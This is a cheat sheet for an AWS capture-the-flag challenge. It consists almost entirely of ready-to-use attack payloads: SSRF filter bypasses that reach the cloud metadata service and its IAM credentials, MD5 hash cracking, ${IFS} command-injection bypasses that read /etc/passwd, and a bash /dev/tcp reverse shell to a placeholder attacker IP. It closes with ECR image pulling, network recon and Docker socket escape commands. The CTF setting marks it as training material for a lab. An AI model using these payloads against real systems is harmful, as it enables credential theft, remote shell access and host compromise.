# AWS CTF Challenge Cheat Sheet

## Quick Setup
```bash
./deploy.sh
cd infrastructure && terraform output
```

## Stage 1: SSRF Bypass (App1)
**Target**: Bypass IP filters to access metadata service

**Blacklist**: `169.254`, `localhost`, `127.0.0.1`, `::1`, `0.0.0.0`

**Bypass Payloads**:
```
http://2852039166/latest/meta-data/local-ipv4
http://0251.0376.0169.0376/latest/meta-data/
http://0xa9.0xfe.0xa9.0xfe/latest/meta-data/
http://169.254.41534/latest/meta-data/
```

**Key Endpoints**:
```
/latest/meta-data/local-ipv4
/latest/meta-data/iam/security-credentials/
/latest/user-data
```

## Stage 2: Password Cracking
**Hash**: `0192023a7bbd73250516f069df18b500` (MD5)

```bash
hashcat -m 0 -a 0 hash.txt rockyou.txt
# Result: admin123
```

## Stage 3: RCE via Command Injection (App2)
**Login**: `admin:admin123`

**Blacklist**: `;`, `&`, `|`, `` ` ``, ` `, `(`, `)`

**Bypass Payloads**:
```bash
8.8.8.8${IFS}&&${IFS}ls
8.8.8.8${IFS}&&${IFS}cat${IFS}/etc/passwd
8.8.8.8${IFS}&&${IFS}find${IFS}/${IFS}-name${IFS}"*flag*"
8.8.8.8$(cat${IFS}/flag)
```

**Reverse Shell**:
```bash
8.8.8.8${IFS}&&${IFS}bash${IFS}-c${IFS}'bash${IFS}-i${IFS}>&${IFS}/dev/tcp/YOUR_IP/4444${IFS}0>&1'
```

## AWS Investigation
```bash
aws ec2 describe-instances --region us-east-1
aws ecr describe-repositories --region us-east-1
aws ecr get-login-password --region us-east-1 | docker login --username AWS --password-stdin ECR_URL
docker pull ECR_URL:latest && docker run -it ECR_URL:latest /bin/bash
```

## Flag Hunting
```bash
cat /flag*
find / -name "*flag*" 2>/dev/null
env | grep -i flag
grep -r "flag" /home/ 2>/dev/null
```

## Network Recon
```bash
nc -zv TARGET_IP 1-1000
curl http://TARGET_IP/
ip route && arp -a
netstat -tulpn
```

## Docker Escape
```bash
mount /dev/sda1 /mnt/host
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host bash
```
